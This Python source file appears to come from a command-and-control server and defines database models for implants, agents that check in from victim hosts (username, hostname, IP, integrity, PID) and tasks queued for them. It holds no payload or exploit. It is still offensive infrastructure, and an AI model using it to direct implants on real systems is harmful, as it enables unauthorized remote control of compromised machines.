import datetime

from connect.output import display
from connect.generate import digit_identifier, string_identifier
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()


class ImplantModel(db.Model):
    # properties
    id = db.Column(db.String, primary_key=True, default=digit_identifier)
    key = db.Column(db.String, unique=True, default=string_identifier)

    # relationships
    agents = db.relationship('AgentModel', backref='implant', lazy=True)

    def get_implant(self):
        return {
            'id': self.id,
            'key': self.key
        }


class AgentModel(db.Model):
    # properties
    id = db.Column(db.String, primary_key=True, default=digit_identifier)
    check_in = db.Column(db.DateTime)
    check_in_task_id = db.Column(db.String, nullable=False, default=digit_identifier)
    _loaded_modules = db.Column(db.String)

    # relationships
    implant_key = db.Column(db.String, db.ForeignKey(ImplantModel.key))
    tasks = db.relationship('TaskModel', backref='agent', order_by='TaskModel.created')

    # system information
    username = db.Column(db.String, nullable=False, default='•'*4)
    hostname = db.Column(db.String, nullable=False, default='•'*4)
    os = db.Column(db.String, nullable=False, default='•'*4)
    ip = db.Column(db.String, nullable=False, default='•'*4)
    integrity = db.Column(db.String, nullable=False, default='•'*4)
    pid = db.Column(db.String, nullable=False, default='•'*4)

    @property
    def loaded_modules(self):
        if not self._loaded_modules:
            return []
        return [str(module) for module in self._loaded_modules.split(',')]

    @loaded_modules.setter
    def loaded_modules(self, value):
        self._loaded_modules = value

    def get_delta(self):
        if not self.check_in:
            return 'Not Connected'
        check_in_seconds = self.get_delta_seconds()
        check_in_minutes = check_in_seconds // 60
        check_in_hours = check_in_minutes // 60
        return f'{check_in_seconds} Second(s)' if check_in_seconds <= 60 else f'{check_in_minutes} Minute(s)' if \
            check_in_minutes <= 60 else f'{check_in_hours} Hour(s)'

    def get_delta_seconds(self):
        if not self.check_in:
            return -1
        return int((datetime.datetime.now() - self.check_in).total_seconds())

    def get_agent(self):
        return {
            'id': self.id,
            'time': self.get_delta(),
            'username': self.username,
            'integrity': self.integrity,
            'os': self.os,
            'ip': self.ip,
            'pid': self.pid
        }

    def get_tasks(self):
        batch_request = []
        for task in self.tasks:
            if task.sent:
                continue
            display(f'Sending task {task.method} to {task.agent.id}', 'INFORMATION')
            batch_request.append(task.get_task())
            task.sent = datetime.datetime.now()
            if task.delete_on_send:
                db.session.delete(task)
            db.session.commit()
        return batch_request


class TaskModel(db.Model):
    # required properties
    id = db.Column(db.String, primary_key=True, default=digit_identifier)
    method = db.Column(db.String, nullable=False)
    created = db.Column(db.DateTime, nullable=False, default=datetime.datetime.now)
    type = db.Column(db.Integer, nullable=False)
    delete_on_send = db.Column(db.Boolean, default=False)

    # optional properties
    _parameters = db.Column(db.String)
    _misc = db.Column(db.String)
    sent = db.Column(db.DateTime)
    completed = db.Column(db.DateTime)
    results = db.Column(db.Text)

    # relationships
    agent_id = db.Column(db.String, db.ForeignKey(AgentModel.id))

    @property
    def parameters(self):
        if not self._parameters:
            return []
        return [str(x) for x in self._parameters.split(',')]

    @parameters.setter
    def parameters(self, value):
        self._parameters = value

    @property
    def misc(self):
        if not self._misc:
            return []
        return [str(x) for x in self._misc.split(',')]

    @misc.setter
    def misc(self, value):
        self._misc = value

    def get_task(self):
        return {
            'method': self.method,
            'params': self.parameters,
            'id': self.id
        }
